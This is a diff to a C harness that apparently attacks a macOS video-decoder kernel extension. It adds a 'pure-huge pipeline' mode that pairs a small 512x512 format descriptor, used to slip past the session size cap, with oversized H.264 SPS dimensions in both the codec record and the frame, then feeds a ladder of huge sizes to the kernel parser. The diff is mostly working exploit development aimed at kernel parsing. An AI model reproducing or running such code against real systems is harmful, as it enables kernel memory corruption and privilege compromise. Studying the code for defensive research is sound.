@@ -279,7 +279,7 @@ static int run_one(int mb_w, int mb_h, int mode, int level)
 		rlinef("    %s", hx);
 	}
 	CMVideoFormatDescriptionRef fmt = NULL;
-	if (mode == 2) {
+	if (mode == 2 || mode == 3) {
 		/* MODE 2 - the descriptor lie: CMVideoFormatDescriptionCreate receives a
 		   small (512x512) descriptor that sails past the session dimension cap,
 		   while the avcC record carries the HUGE SPS so the kext side parses
@@ -351,7 +351,7 @@ static int run_one(int mb_w, int mb_h, int mode, int level)
 	   mode 1 prepends the huge in-band SPS so the kext re-reads the dims. */
 	size_t total;
 	unsigned char *raw = NULL;
-	if (mode == 1) {
+	if (mode == 1 || mode == 3) {
 		total = 4 + bw_len(&sps) + 4 + bw_len(&idr);
 		raw = (unsigned char *)malloc(total);
 		if (raw) {
@@ -472,9 +472,19 @@ int main(void)
 			   session cap; the avcC record carries the huge SPS for the kext. */
 			static const int lad2[][2] = { { 4096, 4096 }, { 4097, 4097 }, { 2049, 4097 }, { 3073, 4097 } };
 			const int lad2_n = sizeof(lad2) / sizeof(lad2[0]);
-			for (int i = 0; i < lad2_n; i++) {
+ 			for (int i = 0; i < lad2_n; i++) {
 				rlinef("--- LADDER mode=2 (descriptor lie) %dx%d mbs level=51 ---", lad2[i][0], lad2[i][1]);
 				run_one(lad2[i][0], lad2[i][1], 2, 51);
+			}
+			/* MODE 3 - the pure-huge pipeline: descriptor lie (512x512, client
+			   gate dead) + HUGE record SPS + HUGE in-band frame SPS. record ==
+			   frame == the huge dims; the only mismatch left for the kext is
+			   the client's own descriptor field. */
+			static const int lad3[][2] = { { 4096, 4096 }, { 4097, 4097 }, { 2049, 4097 }, { 3073, 4097 } };
+			const int lad3_n = sizeof(lad3) / sizeof(lad3[0]);
+			for (int i = 0; i < lad3_n; i++) {
+				rlinef("--- LADDER mode=3 (pure-huge pipeline) %dx%d mbs level=51 ---", lad3[i][0], lad3[i][1]);
+				run_one(lad3[i][0], lad3[i][1], 3, 51);
 			}
 		}
 		rline("vtdec DONE");
